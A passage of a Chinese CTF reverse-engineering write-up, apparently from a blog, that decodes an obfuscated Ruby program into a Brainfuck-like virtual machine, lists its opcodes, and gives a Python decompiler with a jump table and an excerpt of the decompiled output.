class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">begin</span> <span class="hljs-variable">$_</span>=<span class="hljs-variable">$$</span>/<span class="hljs-variable">$$</span>;<br><span class="hljs-variable">@_</span>=<span class="hljs-number">1</span>+<span class="hljs-number">1</span>;<br><span class="hljs-variable">$-</span>_=<span class="hljs-number">1</span>-<span class="hljs-number">2</span>;<br><span class="hljs-variable">$proc1</span>=-&gt;_&#123;_==[]<span class="hljs-params">||</span>_==<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-variable">$.</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span>+<span class="hljs-variable">$proc1</span>[_[<span class="hljs-number">1</span>..-<span class="hljs-number">1</span>]]&#125;<br><span class="hljs-variable">@proc2</span>=-&gt;_,&amp;__&#123;_==[]?[]<span class="hljs-symbol">:</span>[__[_[<span class="hljs-variable">$.</span>]]]+<span class="hljs-variable">@proc2</span>[_[<span class="hljs-number">1</span>..-<span class="hljs-number">1</span>],&amp;__]&#125;<br><span class="hljs-variable">$proc3</span>=-&gt;_&#123;<span class="hljs-variable">@proc2</span>[[*_],&amp;-&gt;__&#123;__[<span class="hljs-variable">$.</span>]&#125;]&#125;<br><span class="hljs-variable">@proc4</span>=-&gt;_&#123;<span class="hljs-variable">@proc2</span>[[*_],&amp;-&gt;__&#123;__[-<span class="hljs-number">1</span>]&#125;]&#125;<br><span class="hljs-variable">$proc5</span>=-&gt;_&#123;var6,var7=<span class="hljs-variable">$proc3</span>[_],<span class="hljs-variable">@proc4</span>[_];<br>var8=<span class="hljs-variable">$proc1</span>[var6];<br>var5=&#123;&#125;;<br>__=<span class="hljs-variable">$.</span>;<br>(_=-&gt;&#123;<br>  var5[var7[__]]=var6[__];<br>(__+=<span class="hljs-number">1</span>)==var8 ?<span class="hljs-symbol">var5:</span>_[]&#125;)[]&#125;<br><span class="hljs-variable">@proc6</span>=-&gt;_,__&#123;_=[*_]+[*__];<br>var5=<span class="hljs-variable">$proc1</span>[_];<br>var6=&#123;&#125;;<br>__=<span class="hljs-variable">$.</span>;<br>(var8=-&gt;&#123;<br>  var6[_[__][<span class="hljs-variable">$.</span>]]=_[__][<span class="hljs-number">1</span>];<br>(__+=<span class="hljs-number">1</span>)==var5 ?<span class="hljs-symbol">var6:</span>var8[]&#125;)[]&#125;<br><span class="hljs-variable">$proc7</span>=-&gt;_&#123;<span class="hljs-variable">$arr1</span>=[];<br><span class="hljs-variable">@varX</span>=<span class="hljs-variable">$proc1</span>[_];<br>__=var6=var5=<span class="hljs-variable">$.</span>;<br><span class="hljs-variable">$var3</span>,<span class="hljs-variable">@var4</span>=&#123;&#125;,[]<br>(var8=-&gt;&#123;<br>  _[var5]==<span class="hljs-string">&#x27;5&#x27;</span>?(<span class="hljs-variable">@var4</span>&lt;&lt;var5)<span class="hljs-symbol">:</span><span class="hljs-variable">$.</span><br>  _[var5]==<span class="hljs-string">&#x27;6&#x27;</span>?(<span class="hljs-variable">$var3</span>[<span class="hljs-variable">@var4</span>[-<span class="hljs-number">1</span>]]=var5;<br><span class="hljs-variable">@var4</span>=<span class="hljs-variable">@var4</span>[<span class="hljs-variable">$.</span>..<span class="hljs-variable">$.</span>-<span class="hljs-number">2</span>])<span class="hljs-symbol">:</span><span class="hljs-variable">$.</span><br>  (var5+=<span class="hljs-number">1</span>)==@varX?<span class="hljs-variable">$.</span><span class="hljs-symbol">:var8[]</span>&#125;)[]<br><span class="hljs-variable">$var3</span>=<span class="hljs-variable">$var3</span>==&#123;&#125;?&#123;&#125;<span class="hljs-symbol">:</span><span class="hljs-variable">@proc6</span>[<span class="hljs-variable">$var3</span>,<span class="hljs-variable">$proc5</span>[<span class="hljs-variable">$var3</span>]]<br>(var7=-&gt;&#123;_[__]==<br><span class="hljs-string">&#x27;0&#x27;</span>?(<span class="hljs-variable">$arr1</span>[var6]<span class="hljs-params">||</span>=<span class="hljs-variable">$.</span>;<br><span class="hljs-variable">$arr1</span>[var6]+=<span class="hljs-number">1</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;1&#x27;</span>?(<span class="hljs-variable">$arr1</span>[var6]<span class="hljs-params">||</span>=<span class="hljs-variable">$.</span>;<br><span class="hljs-variable">$arr1</span>[var6]-=<span class="hljs-number">1</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;2&#x27;</span>?(<span class="hljs-variable">$arr1</span>[var6]<span class="hljs-params">||</span>=<span class="hljs-variable">$.</span>;<br><span class="hljs-variable">$arr1</span>[var6]=STDIN.getc.ord)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;3&#x27;</span><span class="hljs-string">?(</span>var6+=<span class="hljs-number">1</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;4&#x27;</span><span class="hljs-string">?(</span>var6-=<span class="hljs-number">1</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;5&#x27;</span><span class="hljs-string">?(</span>__=(<span class="hljs-variable">$arr1</span>[var6]<span class="hljs-params">||</span><span class="hljs-variable">$.</span>)==<span class="hljs-variable">$.</span><span class="hljs-string">?$</span>var3[__]<span class="hljs-symbol">:__</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;6&#x27;</span><span class="hljs-string">?(</span>__=(<span class="hljs-variable">$arr1</span>[var6]<span class="hljs-params">||</span><span class="hljs-variable">$.</span>)!=<span class="hljs-variable">$.</span><span class="hljs-string">?$</span>var3[__]<span class="hljs-symbol">:__</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;7&#x27;</span>?(<span class="hljs-variable">$&gt;</span>&lt;&lt;(<span class="hljs-string">&#x27;&#x27;</span>&lt;&lt;<span class="hljs-variable">$arr1</span>[var6]))<span class="hljs-symbol">:</span><span class="hljs-variable">$.</span><br>(__+=<span class="hljs-number">1</span>)==@varX?<span class="hljs-symbol">_:</span>var7[]&#125;)[]&#125;<br><span class="hljs-variable">$proc7</span>[<span class="hljs-string">&#xx27;</span>];<br><span class="hljs-keyword">rescue</span> Exception;<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>虚拟机，指令集如下</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta"># 0: arr1[var6]+=1</span><br><span class="hljs-meta"># 1: $arr1[var6]-=1</span><br><span class="hljs-meta"># 2: $arr1[var6]=STDIN.getc.ord</span><br><span class="hljs-meta"># 3: var6+=1</span><br><span class="hljs-meta"># 4: var6-=1</span><br><span class="hljs-meta"># 5: if(arr1[var6] == 0) goto $var3[__]</span><br><span class="hljs-meta"># 6: if(arr1[var6] != 0) goto $var3[__]</span><br><span class="hljs-meta"># 7: putchar(arr1[var6])</span><br></code></pre></td></tr></table></figure><p><code>$var3</code> 是跳转表，是 load 虚拟机字节码的时候生成的，可以直接 print 输出获得。</p><h2 id="编写-decompiler"><a href="#编写-decompiler" class="headerlink" title="编写 decompiler"></a>编写 decompiler</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-string">&#xx27;</span><br><br>addr = <span class="hljs-number">0</span><br>var3 = &#123;<span class="hljs-number">2</span>: <span class="hljs-string">&#x27;_5&#x27;</span>, <span class="hljs-number">6</span>: <span class="hljs-string">&#x27;_9&#x27;</span>,<br> <span class="hljs-number">19</span>: <span class="hljs-string">&#x27;_21&#x27;</span>,<br> <span class="hljs-number">43</span>: <span class="hljs-string">&#x27;_36&#x27;</span>,<br> <span class="hljs-number">76</span>: <span class="hljs-string">&#x27;_59&#x27;</span>,<br> <span class="hljs-number">93</span>: <span class="hljs-string">&#x27;_60&#x27;</span>,<br> <span class="hljs-number">100</span>: <span class="hljs-string">&#x27;_67&#x27;</span>,<br> <span class="hljs-number">105</span>: <span class="hljs-string">&#x27;_6c&#x27;</span>,<br> <span class="hljs-number">109</span>: <span class="hljs-string">&#x27;_76&#x27;</span>,<br> <span class="hljs-number">119</span>: <span class="hljs-string">&#x27;_7d&#x27;</span>,<br> <span class="hljs-number">128</span>: <span class="hljs-string">&#x27;_83&#x27;</span>,<br> <span class="hljs-number">135</span>: <span class="hljs-string">&#x27;_8a&#x27;</span>,<br> <span class="hljs-number">139</span>: <span class="hljs-string">&#x27;_8e&#x27;</span>,<br> <span class="hljs-number">149</span>: <span class="hljs-string">&#x27;_a5&#x27;</span>,<br> <span class="hljs-number">170</span>: <span class="hljs-string">&#x27;_b0&#x27;</span>,<br> <span class="hljs-number">180</span>: <span class="hljs-string">&#x27;_b7&#x27;</span>,<br> <span class="hljs-number">186</span>: <span class="hljs-string">&#x27;_bd&#x27;</span>,<br> <span class="hljs-number">193</span>: <span class="hljs-string">&#x27;_c4&#x27;</span>,<br> <span class="hljs-number">199</span>: <span class="hljs-string">&#x27;_d4&#x27;</span>,<br> <span class="hljs-number">213</span>: <span class="hljs-string">&#x27;_db&#x27;</span>,<br> <span class="hljs-number">224</span>: <span class="hljs-string">&#x27;_e3&#x27;</span>,<br> <span class="hljs-number">177</span>: <span class="hljs-string">&#x27;_e4&#x27;</span>,<br> <span class="hljs-number">228</span>: <span class="hljs-string">&#x27;_e7&#x27;</span>,<br> <span class="hljs-number">235</span>: <span class="hljs-string">&#x27;_ee&#x27;</span>,<br> <span class="hljs-number">239</span>: <span class="hljs-string">&#x27;_f2&#x27;</span>,<br> <span class="hljs-number">248</span>: <span class="hljs-string">&#x27;_106&#x27;</span>,<br> <span class="hljs-number">268</span>: <span class="hljs-string">&#x27;_112&#x27;</span>,<br> <span class="hljs-number">278</span>: <span class="hljs-string">&#x27;_119&#x27;</span>,<br> <span class="hljs-number">284</span>: <span class="hljs-string">&#x27;_11f&#x27;</span>,<br> <span class="hljs-number">291</span>: <span class="hljs-string">&#x27;_126&#x27;</span>,<br> <span class="hljs-number">297</span>: <span class="hljs-string">&#x27;_136&#x27;</span>,<br> <span class="hljs-number">311</span>: <span class="hljs-string">&#x27;_13d&#x27;</span>,<br> <span class="hljs-number">322</span>: <span class="hljs-string">&#x27;_145&#x27;</span>,<br> <span class="hljs-number">275</span>: <span class="hljs-string">&#x27;_146&#x27;</span>,<br> <span class="hljs-number">326</span>: <span class="hljs-string">&#x27;_149&#x27;</span>,<br> <span class="hljs-number">333</span>: <span class="hljs-string">&#x27;_150&#x27;</span>,<br> <span class="hljs-number">337</span>: <span class="hljs-string">&#x27;_154&#x27;</span>,<br> <span class="hljs-number">348</span>: <span class="hljs-string">&#x27;_16c&#x27;</span>,<br> <span class="hljs-number">370</span>: <span class="hljs-string">&#x27;_178&#x27;</span>,<br> <span class="hljs-number">380</span>: <span class="hljs-string">&#x27;_17f&#x27;</span>,<br> <span class="hljs-number">386</span>: <span class="hljs-string">&#x27;_185&#x27;</span>,<br> <span class="hljs-number">393</span>: <span class="hljs-string">&#x27;_18c&#x27;</span>,<br> <span class="hljs-number">399</span>: <span class="hljs-string">&#x27;_19c&#x27;</span>,<br> <span class="hljs-number">413</span>: <span class="hljs-string">&#x27;_1a3&#x27;</span>,<br> <span class="hljs-number">424</span>: <span class="hljs-string">&#x27;_1ab&#x27;</span>,<br> <span class="hljs-number">377</span>: <span class="hljs-string">&#x27;_1ac&#x27;</span>,<br> <span class="hljs-number">428</span>: <span class="hljs-string">&#x27;_1af&#x27;</span>,<br> <span class="hljs-number">435</span>: <span class="hljs-string">&#x27;_1b6&#x27;</span>,<br> <span class="hljs-number">439</span>: <span class="hljs-string">&#x27;_1ba&#x27;</span>,<br> <span class="hljs-number">450</span>: <span class="hljs-string">&#x27;_1d3&#x27;</span>,<br> <span class="hljs-number">473</span>: <span class="hljs-string">&#x27;_1df&#x27;</span>,<br> <span class="hljs-number">483</span>: <span class="hljs-string">&#x27;_1e6&#x27;</span>,<br> <span class="hljs-number">489</span>: <span class="hljs-string">&#x27;_1ec&#x27;</span>,<br> <span class="hljs-number">496</span>: <span class="hljs-string">&#x27;_1f3&#x27;</span>,<br> <span class="hljs-number">502</span>: <span class="hljs-string">&#x27;_203&#x27;</span>,<br> <span class="hljs-number">516</span>: <span class="hljs-string">&#x27;_20a&#x27;</span>,<br> <span class="hljs-number">527</span>: <span class="hljs-string">&#x27;_212&#x27;</span>,<br> <span class="hljs-number">480</span>: <span class="hljs-string">&#x27;_213&#x27;</span>,<br> <span class="hljs-number">531</span>: <span class="hljs-string">&#x27;_216&#x27;</span>,<br> <span class="hljs-number">538</span>: <span class="hljs-string">&#x27;_21d&#x27;</span>,<br> <span class="hljs-number">542</span>: <span class="hljs-string">&#x27;_221&#x27;</span>,<br> <span class="hljs-number">550</span>: <span class="hljs-string">&#x27;_236&#x27;</span>,<br> <span class="hljs-number">571</span>: <span class="hljs-string">&#x27;_241&#x27;</span>,<br> <span class="hljs-number">581</span>: <span class="hljs-string">&#x27;_248&#x27;</span>,<br> <span class="hljs-number">587</span>: <span class="hljs-string">&#x27;_24e&#x27;</span>,<br> <span class="hljs-number">594</span>: <span class="hljs-string">&#x27;_255&#x27;</span>,<br> <span class="hljs-number">600</span>: <span class="hljs-string">&#x27;_265&#x27;</span>,<br> <span class="hljs-number">614</span>: <span class="hljs-string">&#x27;_26c&#x27;</span>,<br> <span class="hljs-number">625</span>: <span class="hljs-string">&#x27;_274&#x27;</span>,<br> <span class="hljs-number">578</span>: <span class="hljs-string">&#x27;_275&#x27;</span>,<br> <span class="hljs-number">629</span>: <span class="hljs-string">&#x27;_278&#x27;</span>,<br> <span class="hljs-number">633</span>: <span class="hljs-string">&#x27;_27c&#x27;</span>,<br> <span class="hljs-number">638</span>: <span class="hljs-string">&#x27;_287&#x27;</span>,<br> <span class="hljs-number">649</span>: <span class="hljs-string">&#x27;_291&#x27;</span>,<br> <span class="hljs-number">661</span>: <span class="hljs-string">&#x27;_298&#x27;</span>,<br> <span class="hljs-number">665</span>: <span class="hljs-string">&#x27;_29c&#x27;</span>,<br> <span class="hljs-number">678</span>: <span class="hljs-string">&#x27;_2b5&#x27;</span>,<br> <span class="hljs-number">703</span>: <span class="hljs-string">&#x27;_2c2&#x27;</span>,<br> <span class="hljs-number">658</span>: <span class="hljs-string">&#x27;_2c3&#x27;</span>,<br> <span class="hljs-number">4</span>: <span class="hljs-string">&#x27;_3&#x27;</span>,<br> <span class="hljs-number">8</span>: <span class="hljs-string">&#x27;_7&#x27;</span>,<br> <span class="hljs-number">32</span>: <span class="hljs-string">&#x27;_14&#x27;</span>,<br> <span class="hljs-number">53</span>: <span class="hljs-string">&#x27;_2c&#x27;</span>,<br> <span class="hljs-number">88</span>: <span class="hljs-string">&#x27;_4d&#x27;</span>,<br> <span class="hljs-number">95</span>: <span class="hljs-string">&#x27;_5e&#x27;</span>,<br> <span class="hljs-number">102</span>: <span class="hljs-string">&#x27;_65&#x27;</span>,<br> <span class="hljs-number">107</span>: <span class="hljs-string">&#x27;_6a&#x27;</span>,<br> <span class="hljs-number">117</span>: <span class="hljs-string">&#x27;_6e&#x27;</span>,<br> <span class="hljs-number">124</span>: <span class="hljs-string">&#x27;_78&#x27;</span>,<br> <span class="hljs-number">130</span>: <span class="hljs-string">&#x27;_81&#x27;</span>,<br> <span class="hljs-number">137</span>: <span class="hljs-string">&#x27;_88&#x27;</span>,<br> <span class="hljs-number">141</span>: <span class="hljs-string">&#x27;_8c&#x27;</span>,<br> <span class="hljs-number">164</span>: <span class="hljs-string">&#x27;_96&#x27;</span>,<br> <span class="hljs-number">175</span>: <span class="hljs-string">&#x27;_ab&#x27;</span>,<br> <span class="hljs-number">182</span>: <span class="hljs-string">&#x27;_b5&#x27;</span>,<br> <span class="hljs-number">188</span>: <span class="hljs-string">&#x27;_bb&#x27;</span>,<br> <span class="hljs-number">195</span>: <span class="hljs-string">&#x27;_c2&#x27;</span>,<br> <span class="hljs-number">211</span>: <span class="hljs-string">&#x27;_c8&#x27;</span>,<br> <span class="hljs-number">218</span>: <span class="hljs-string">&#x27;_d6&#x27;</span>,<br> <span class="hljs-number">226</span>: <span class="hljs-string">&#x27;_e1&#x27;</span>,<br> <span class="hljs-number">227</span>: <span class="hljs-string">&#x27;_b2&#x27;</span>,<br> <span class="hljs-number">230</span>: <span class="hljs-string">&#x27;_e5&#x27;</span>,<br> <span class="hljs-number">237</span>: <span class="hljs-string">&#x27;_ec&#x27;</span>,<br> <span class="hljs-number">241</span>: <span class="hljs-string">&#x27;_f0&#x27;</span>,<br> <span class="hljs-number">261</span>: <span class="hljs-string">&#x27;_f9&#x27;</span>,<br> <span class="hljs-number">273</span>: <span class="hljs-string">&#x27;_10d&#x27;</span>,<br> <span class="hljs-number">280</span>: <span class="hljs-string">&#x27;_117&#x27;</span>,<br> <span class="hljs-number">286</span>: <span class="hljs-string">&#x27;_11d&#x27;</span>,<br> <span class="hljs-number">293</span>: <span class="hljs-string">&#x27;_124&#x27;</span>,<br> <span class="hljs-number">309</span>: <span class="hljs-string">&#x27;_12a&#x27;</span>,<br> <span class="hljs-number">316</span>: <span class="hljs-string">&#x27;_138&#x27;</span>,<br> <span class="hljs-number">324</span>: <span class="hljs-string">&#x27;_143&#x27;</span>,<br> <span class="hljs-number">325</span>: <span class="hljs-string">&#x27;_114&#x27;</span>,<br> <span class="hljs-number">328</span>: <span class="hljs-string">&#x27;_147&#x27;</span>,<br> <span class="hljs-number">335</span>: <span class="hljs-string">&#x27;_14e&#x27;</span>,<br> <span class="hljs-number">339</span>: <span class="hljs-string">&#x27;_152&#x27;</span>,<br> <span class="hljs-number">363</span>: <span class="hljs-string">&#x27;_15d&#x27;</span>,<br> <span class="hljs-number">375</span>: <span class="hljs-string">&#x27;_173&#x27;</span>,<br> <span class="hljs-number">382</span>: <span class="hljs-string">&#x27;_17d&#x27;</span>,<br> <span class="hljs-number">388</span>: <span class="hljs-string">&#x27;_183&#x27;</span>,<br> <span class="hljs-number">395</span>: <span class="hljs-string">&#x27;_18a&#x27;</span>,<br> <span class="hljs-number">411</span>: <span class="hljs-string">&#x27;_190&#x27;</span>,<br> <span class="hljs-number">418</span>: <span class="hljs-string">&#x27;_19e&#x27;</span>,<br> <span class="hljs-number">426</span>: <span class="hljs-string">&#x27;_1a9&#x27;</span>,<br> <span class="hljs-number">427</span>: <span class="hljs-string">&#x27;_17a&#x27;</span>,<br> <span class="hljs-number">430</span>: <span class="hljs-string">&#x27;_1ad&#x27;</span>,<br> <span class="hljs-number">437</span>: <span class="hljs-string">&#x27;_1b4&#x27;</span>,<br> <span class="hljs-number">441</span>: <span class="hljs-string">&#x27;_1b8&#x27;</span>,<br> <span class="hljs-number">466</span>: <span class="hljs-string">&#x27;_1c3&#x27;</span>,<br> <span class="hljs-number">478</span>: <span class="hljs-string">&#x27;_1da&#x27;</span>,<br> <span class="hljs-number">485</span>: <span class="hljs-string">&#x27;_1e4&#x27;</span>,<br> <span class="hljs-number">491</span>: <span class="hljs-string">&#x27;_1ea&#x27;</span>,<br> <span class="hljs-number">498</span>: <span class="hljs-string">&#x27;_1f1&#x27;</span>,<br> <span class="hljs-number">514</span>: <span class="hljs-string">&#x27;_1f7&#x27;</span>,<br> <span class="hljs-number">521</span>: <span class="hljs-string">&#x27;_205&#x27;</span>,<br> <span class="hljs-number">529</span>: <span class="hljs-string">&#x27;_210&#x27;</span>,<br> <span class="hljs-number">530</span>: <span class="hljs-string">&#x27;_1e1&#x27;</span>,<br> <span class="hljs-number">533</span>: <span class="hljs-string">&#x27;_214&#x27;</span>,<br> <span class="hljs-number">540</span>: <span class="hljs-string">&#x27;_21b&#x27;</span>,<br> <span class="hljs-number">544</span>: <span class="hljs-string">&#x27;_21f&#x27;</span>,<br> <span class="hljs-number">565</span>: <span class="hljs-string">&#x27;_227&#x27;</span>,<br> <span class="hljs-number">576</span>: <span class="hljs-string">&#x27;_23c&#x27;</span>,<br> <span class="hljs-number">583</span>: <span class="hljs-string">&#x27;_246&#x27;</span>,<br> <span class="hljs-number">589</span>: <span class="hljs-string">&#x27;_24c&#x27;</span>,<br> <span class="hljs-number">596</span>: <span class="hljs-string">&#x27;_253&#x27;</span>,<br> <span class="hljs-number">612</span>: <span class="hljs-string">&#x27;_259&#x27;</span>,<br> <span class="hljs-number">619</span>: <span class="hljs-string">&#x27;_267&#x27;</span>,<br> <span class="hljs-number">627</span>: <span class="hljs-string">&#x27;_272&#x27;</span>,<br> <span class="hljs-number">628</span>: <span class="hljs-string">&#x27;_243&#x27;</span>,<br> <span class="hljs-number">631</span>: <span class="hljs-string">&#x27;_276&#x27;</span>,<br> <span class="hljs-number">635</span>: <span class="hljs-string">&#x27;_27a&#x27;</span>,<br> <span class="hljs-number">646</span>: <span class="hljs-string">&#x27;_27f&#x27;</span>,<br> <span class="hljs-number">656</span>: <span class="hljs-string">&#x27;_28a&#x27;</span>,<br> <span class="hljs-number">663</span>: <span class="hljs-string">&#x27;_296&#x27;</span>,<br> <span class="hljs-number">667</span>: <span class="hljs-string">&#x27;_29a&#x27;</span>,<br> <span class="hljs-number">692</span>: <span class="hljs-string">&#x27;_2a7&#x27;</span>,<br> <span class="hljs-number">705</span>: <span class="hljs-string">&#x27;_2c0&#x27;</span>,<br> <span class="hljs-number">706</span>: <span class="hljs-string">&#x27;_293&#x27;</span>&#125;<br>var6 = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> op <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-string">&#x27;0&#x27;</span>:<br>        print(<span class="hljs-string">&quot;_%x: arr1[var6]+=1;&quot;</span> % addr)<br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&#x27;1&#x27;</span>:<br>        print(<span class="hljs-string">&quot;_%x: arr1[var6]-=1;&quot;</span> %  addr)<br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&quot;2&quot;</span>:<br>        print(<span class="hljs-string">&quot;_%x: arr1[var6]=getchar();&quot;</span>   % addr)<br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&quot;3&quot;</span>:<br>        print(<span class="hljs-string">&quot;_%x: var6+=1;&quot;</span>% addr)<br>        var6 += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&quot;4&quot;</span>:<br>        print(<span class="hljs-string">&quot;_%x: var6-=1;&quot;</span> % addr)<br>        var6 -= <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&quot;5&quot;</span>:<br>        print((<span class="hljs-string">&quot;_%x: if(arr1[var6] == 0) goto &quot;</span> + var3[addr] + <span class="hljs-string">&quot;;&quot;</span>) %  addr)<br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&quot;6&quot;</span>:<br>        print((<span class="hljs-string">&quot;_%x: if(arr1[var6] != 0) goto &quot;</span> + var3[addr] + <span class="hljs-string">&quot;;&quot;</span>) %   addr)<br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&quot;7&quot;</span>:<br>        print(<span class="hljs-string">&quot;_%x: putchar(arr1[var6]);&quot;</span>  % addr)<br>    <span class="hljs-keyword">else</span>:<br>        print(op)<br>        <span class="hljs-keyword">raise</span><br>    addr += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="第四层-vm-分析"><a href="#第四层-vm-分析" class="headerlink" title="第四层 vm 分析"></a>第四层 vm 分析</h2><p>decompiler 结果如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++">_0: var6+=<span class="hljs-number">1</span>;<br>_1: var6+=<span class="hljs-number">1</span>;<br>_2: <span class="hljs-keyword">if</span>(arr1[var6] == <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _5;<br>_3: arr1[var6]-=<span class="hljs-number">1</span>;<br>_4: <span class="hljs-keyword">if</span>(arr1[var6] != <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _3;<br>_5: var6+=<span class="hljs-number">1</span>;<br>_6: <span class="hljs-keyword">if</span>(arr1[var6] == <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _9;<br>_7: arr1[var6]-=<span class="hljs-number">1</span>;<br>_8: <span class="hljs-keyword">if</span>(arr1[var6] != <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _7;<br>_9: var6-=<span class="hljs-number">1</span>;<br><br>............  节选<br>    <br><br>_2bd: var6-=<span class="hljs-number">1</span>;<br>_2be: var6-=<span class="hljs-number">1</span>;<br>_2bf: <span class="hljs-keyword">if</span>(arr1[var6] == <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _2c2;<br>_2c0: arr1[var6]-=<span class="hljs-number">1</span>;<br>_2c1: <span class="hljs-keyword">if</span>(arr1[var6] != <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _2c0;<br>_2c2: <span 